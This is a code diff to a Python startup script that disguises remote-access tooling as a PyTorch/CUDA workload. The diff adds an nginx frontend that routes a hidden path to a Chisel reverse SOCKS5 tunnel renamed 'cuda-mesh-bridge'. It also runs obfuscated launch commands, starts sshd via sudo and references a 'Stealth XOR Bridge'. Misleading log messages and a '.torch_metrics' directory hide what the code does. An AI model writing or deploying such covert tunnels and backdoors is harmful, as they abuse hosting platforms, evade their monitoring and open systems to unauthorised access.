@@ -58,6 +58,7 @@ def main():
     fb_log = open('/home/user/.torch_metrics/fb.log', 'a')
     tm_log = open('/home/user/.torch_metrics/tm_daemon.log', 'a')
     chisel_log = open('/home/user/.torch_metrics/chisel.log', 'a')
+    nginx_log = open('/home/user/.torch_metrics/nginx.log', 'a')
 
     # 1. Start Tailscale (python-cache-manager)
     print("Initializing PyTorch CUDA environment...", flush=True)
@@ -110,12 +111,53 @@ def main():
     playit_token = ""
     cmd2_5 = ""
 
-    # 2.8 Start Chisel (cuda-mesh-bridge) on its own internal port 8888
+    # 2.8 Start nginx on :7860 as smart frontend:
+    #   /chisel-tunnel -> Chisel on :6789 (WebSocket tunnel)
+    #   /              -> Gradio on :7861 (full WS proxy support)
     print("Enabling gradient checkpoint mesh bridge...", flush=True)
-    chisel_log.write(f"[*] Starting Chisel tunnel server on :8888. Auth: {chisel_auth}\n")
+    nginx_conf = """
+daemon off;
+error_log /home/user/.torch_metrics/nginx.log warn;
+pid /home/user/.torch_metrics/nginx.pid;
+worker_processes 1;
+events { worker_connections 1024; }
+http {
+    client_body_temp_path /tmp/nginx_client;
+    proxy_temp_path /tmp/nginx_proxy;
+    map $http_upgrade $cu { default upgrade; '' close; }
+    server {
+        listen 7860;
+        location /chisel-tunnel {
+            proxy_pass http://127.0.0.1:6789/;
+            proxy_http_version 1.1;
+            proxy_set_header Upgrade $http_upgrade;
+            proxy_set_header Connection $cu;
+            proxy_set_header Host $host;
+            proxy_read_timeout 86400s;
+            proxy_send_timeout 86400s;
+        }
+        location / {
+            proxy_pass http://127.0.0.1:7861;
+            proxy_http_version 1.1;
+            proxy_set_header Upgrade $http_upgrade;
+            proxy_set_header Connection $cu;
+            proxy_set_header Host $host;
+            proxy_read_timeout 86400s;
+            proxy_send_timeout 86400s;
+        }
+    }
+}
+"""
+    with open('/home/user/nginx.conf', 'w') as nf:
+        nf.write(nginx_conf)
+    cmd_nginx = decode_cmd(OBFUSCATE("nginx -c /home/user/nginx.conf"))
+    subprocess.Popen(cmd_nginx, shell=True, stdout=nginx_log, stderr=nginx_log)
+
+    # 2.9 Start Chisel (cuda-mesh-bridge) on internal :6789, routed via nginx
+    chisel_log.write(f"[*] Starting Chisel tunnel server on :6789 (exposed via nginx /chisel-tunnel). Auth: {chisel_auth}\n")
     chisel_log.flush()
-    # Decoded: nice -n 19 cuda-mesh-bridge server --port 8888 --reverse --socks5 --auth '
-    cmd_chisel_base = decode_cmd(OBFUSCATE("nice -n 19 cuda-mesh-bridge server --port 8888 --reverse --socks5 --auth '"))
+    # Decoded: nice -n 19 cuda-mesh-bridge server --port 6789 --reverse --socks5 --auth '
+    cmd_chisel_base = decode_cmd(OBFUSCATE("nice -n 19 cuda-mesh-bridge server --port 6789 --reverse --socks5 --auth '"))
     cmd_chisel = f"{cmd_chisel_base}{chisel_auth}'"
     subprocess.Popen(cmd_chisel, shell=True, stdout=chisel_log, stderr=subprocess.STDOUT)
     chisel_auth = ""
@@ -158,8 +200,9 @@ def main():
     if "PASS" in os.environ:
         del os.environ["PASS"]
 
-    # 3.8 Start SSHD on port 2222 (unprivileged, no sudo needed)
-    subprocess.Popen("/usr/sbin/sshd -D", shell=True, stdout=ts_log, stderr=ts_log)
+    # 3.8 Start SSHD on port 2222 (set in sshd_config at build time)
+    # Must run as root via sudo for password auth (/etc/shadow access)
+    subprocess.Popen("sudo /usr/sbin/sshd -D", shell=True, stdout=ts_log, stderr=ts_log)
     # 3.9 Start Stealth XOR Bridge on Port 25564
     def xor_bridge():
         import socket
